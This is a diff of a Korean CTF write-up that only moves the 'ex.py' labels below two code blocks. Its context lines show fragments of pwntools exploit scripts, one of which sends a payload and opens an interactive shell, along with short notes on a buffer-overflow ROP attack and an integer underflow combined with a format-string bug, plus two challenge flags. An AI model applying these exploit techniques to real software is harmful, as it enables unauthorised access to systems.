@@ -161,8 +161,6 @@ int vuln()
 다음과 같이 BOF가 발생하는 것을 볼 수 있다.
 ROP 해주면 된다.
 
-<ul><li>ex.py</li></ul>
-
 ```
 from pwn import *
 
@@ -199,6 +197,7 @@ p.sendline(payload)
 p.sendline(bin_sh)
 p.interactive()
 ```
+<ul><li>ex.py</li></ul>
 
 #### FLAG : LAYER7{1_r3411y_H4t3_t41m0_^______^}
 
@@ -266,8 +265,6 @@ if ( v2 == 3 )
 
 Loan 이라는 돈을 빌리는 메뉴에서 음수체크를 따로 하지 않는다는 것을 보았고, 이를 이용해 Integer underflow로 돈을 모은 뒤, 포맷스트링으로 슥슥삭삭 했다.
 
-<ul><li>ex.py</li></ul>
-
 ```
 from pwn import *
 
@@ -306,6 +303,7 @@ for i in range(1,12):
 
 print(flag)
 ```
+<ul><li>ex.py</li></ul>
 
 #### FLAG : LAYER7{L1f3..1s..P0k3m0n_or_D1g1m0n..wh4t}
 
